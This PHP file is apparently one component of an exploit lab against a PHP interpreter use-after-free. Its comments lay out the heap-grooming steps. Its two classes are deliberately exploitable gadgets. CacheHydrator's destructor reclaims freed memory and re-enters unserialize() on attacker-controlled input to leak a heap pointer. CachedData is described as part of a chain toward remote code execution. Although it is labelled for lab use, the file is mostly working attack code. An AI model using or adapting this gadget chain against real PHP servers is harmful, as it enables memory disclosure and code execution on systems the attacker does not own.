<?php
/* Gadget for the #24481 remote-delivery lab (php-src issue #24481 --
 * var_destroy deferred-destructor reentry UAF -> IS_LONG heap-pointer leak).
 *
 * Unlike the a7 CachedData gadget (a Serializable whose unserialize() handler
 * re-enters during the MAIN parse), #24481 needs a plain __destruct that fires
 * from var_destroy's deferred-dtor loop (serialize_lock==0, level==1) AFTER the
 * overflow var_entries chunk is freed. CacheHydrator models a realistic "lazy
 * cache rehydration" POP gadget: its __destruct allocates a working-set array
 * and rehydrates it by re-entering unserialize() on an attacker-controlled
 * property ($blob), then publishes the working-set for the response.
 *
 *   (b) $a = [...]        -- a packed array sized by $n; its arData reclaims the
 *                           freed 2-page var_entries run.
 *   (c) unserialize($blob) -- one var_push into the dangling slot writes a live
 *                           heap pointer into &$a[0].value, leaving u1=IS_LONG,
 *                           so $a[0] reads back as a plain integer (the leak).
 *
 * Attacker controls $blob (nested bytes, a single-scalar unserialize) and $n
 * (reclaimer size 130..256 -> a 2-page run) via the serialized object's
 * properties. The orphaned-by-dup-key object fires this __destruct in teardown.
 *
 * Lab/analysis use only, on systems you own.
 */

error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', '0');

/* The a7 (iQingshan CachedData) Serializable gadget -- present so the SAME
 * immortal worker also offers an a7 echo sink (remote_app.php). The fully-remote
 * fpm chain sources the chunk from #24481 (remote_app24481.php) and then uses
 * a7's forged-IS_STRING read + UAF->RCE fire over this gadget (remote_app.php);
 * both ride the same per-process 2 MiB chunk so the masks agree. */
class CachedData implements Serializable
{
    public function serialize(): string
    {
        return '';
    }

    public function unserialize(string $data): void
    {
        unserialize($data)->x = 0;
    }
}

class CacheHydrator
{
    public $blob;
    public $n;

    public function __destruct()
    {
        $n = (int) $this->n;
        if ($n < 1 || $n > 4096) {
            return;
        }
        // (b) packed reclaimer array -> catches the freed 2-page var_entries run.
        $a = [];
        for ($i = 0; $i < $n; $i++) {
            $a[$i] = 0x5A5A5A5A00000000 | $i;
        }
        // (c) rehydrate by re-entering unserialize on the attacker blob; the
        // single var_push clobbers &$a[0].value with a live heap pointer.
        @unserialize((string) $this->blob);
        // publish the rehydrated working-set for the app response.
        $GLOBALS['__hydrated'] = $a;
    }
}
